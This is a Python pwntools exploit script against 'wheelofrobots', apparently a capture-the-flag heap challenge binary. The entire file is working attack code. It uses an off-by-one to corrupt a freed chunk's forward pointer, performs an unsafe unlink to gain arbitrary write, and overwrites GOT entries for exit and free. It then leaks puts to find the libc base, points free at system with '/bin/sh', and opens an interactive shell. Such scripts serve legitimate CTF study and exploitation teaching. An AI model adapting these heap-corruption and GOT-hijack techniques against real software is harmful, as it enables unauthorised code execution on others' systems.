#!/usr/bin/env python
# coding=utf-8
from pwn import *
context.log_level = "debug"
sh = process('./wheelofrobots')
elf = ELF('./wheelofrobots')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

ret_addr = 0x4007f9

def Add(index, size):
    sh.recvuntil("Your choice : ")
    sh.sendline("1")
    sh.recvuntil("Your choice :")
    sh.sendline(str(index))
    if(index == 2 or index == 3 or index ==6):
        sh.sendline(str(size))

def Delete(index):
    sh.recvuntil("Your choice : ")
    sh.sendline("2")
    sh.recvuntil("Your choice :")
    sh.sendline(str(index))

def Change(index, name):
    sh.recvuntil("Your choice : ")
    sh.sendline("3")
    sh.recvuntil("Your choice :")
    sh.sendline(str(index))
    sh.recvuntil("Robot's name: \n")
    sh.send(name)

def Start():
    sh.recvuntil("Your choice : ")
    sh.sendline("4")

def Oneoff(inuse):
    sh.recvuntil("Your choice : ")
    sh.sendline("1")
    sh.recvuntil("Your choice :")
    sh.sendline("1111"+inuse)

def Write(ptr, write_into_ptr):
    Change(1, p64(ptr))
    Change(6, p64(write_into_ptr))

#Oneoff to change 6's size
Add(2, 1)
Delete(2)
Oneoff('\x01')
    #2->free chunk, so change free chunk's fd
Change(2, p64(0x603138))
Oneoff('\x00')
Add(2, 1)
Add(3, 0x20)
Add(1, 0)
Delete(2)
Delete(3)

#unlink
Add(6, 7)
Add(3, 7)
payload1=p64(0)*2 + p64(0x6030e8-0x18) + p64(0x6030e8-0x10) + '\x77'*0x70 + p64(0x90) + p64(0xa0)
Change(1, p64(0x300))
Change(6, payload1)
Delete(3)
payload2=p64(0)*5 + p64(0x6030e8)
Change(6, payload2)
Write(elf.got['exit'], ret_addr)
Write(0x603130, 3)

Change(1, p64(elf.got['puts']))
Start()
sh.recvuntil('New hands great!! Thx ')
puts_addr=sh.recvuntil('!\n', drop=True).ljust(8,'\x00')
puts_addr=u64(puts_addr)
libc_base=puts_addr - libc.sym['puts']
sys_addr=libc_base + libc.sym['system']
bin_addr=libc_base + next(libc.search('/bin/sh'))
print hex(libc_base)
Write(elf.got['free'], sys_addr)
Write(0x603130, 2)
Add(2, 1)
Write(0x6030f0, bin_addr)
Delete(2)
sh.interactive()
